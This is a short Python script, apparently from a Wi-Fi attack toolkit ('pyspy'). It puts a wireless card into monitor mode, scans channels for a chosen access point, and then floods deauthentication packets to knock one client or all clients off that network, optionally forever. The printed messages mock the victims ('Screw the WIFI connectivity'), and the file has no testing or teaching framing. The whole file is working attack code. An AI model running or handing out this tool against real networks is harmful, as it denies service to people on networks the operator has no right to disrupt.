from pyspy.attacks import deauth
from pyspy.callbacks import get_hostnames, getDF
from pyspy.config import interface, get_deauth_args, get_interfaces
from threading import Thread
from scapy import *
from time import sleep
from scapy.all import *
import pandas

if __name__ == '__main__':
    arguments = get_deauth_args()
    if arguments.interface:
        my_interface = interface(arguments.interface)
    else:
        my_interface = interface(get_interfaces()[1])
    my_interface.set_monitor_mode()
    networks = getDF()
    while(arguments.bssid not in networks.index):
        sniff(prn=get_hostnames, iface=my_interface.name, count = 50)
        networks = getDF()
        my_interface.channel += 1
        my_interface.channel = my_interface.channel %14
    channel_for_deauth = networks.loc[arguments.bssid, "Channel"]
    my_interface.change_channel(channel_for_deauth)
    if arguments.destination_mac:
        if arguments.forever:
            print(f"Sending Packets Forever!!! Screw the WIFI connectivity to: {networks.loc[arguments.bssid, 'SSID']}!!!")
            deauth(my_interface.name, 
                    arguments.bssid, 
                    arguments.destination_mac, 
                    forever=True)
        else:
            print(f"Sending 2000 Packets!!! Screw the WIFI connectivity to: {networks.loc[arguments.bssid, 'SSID']}!!!")
            deauth(my_interface.name, 
                    arguments.bssid, 
                    arguments.destination_mac)
    else:
        if arguments.forever:
            print(f"Sending Packets Forever!!! Screw the WIFI connectivity to all the things!!!")
            deauth(my_interface.name, 
                    arguments.bssid, 
                    forever=True)
        else:
            print(f"Sending 2000 Packets!!! Screw the WIFI connectivity to all the things!!!")
            deauth(my_interface.name, 
                    arguments.bssid)
        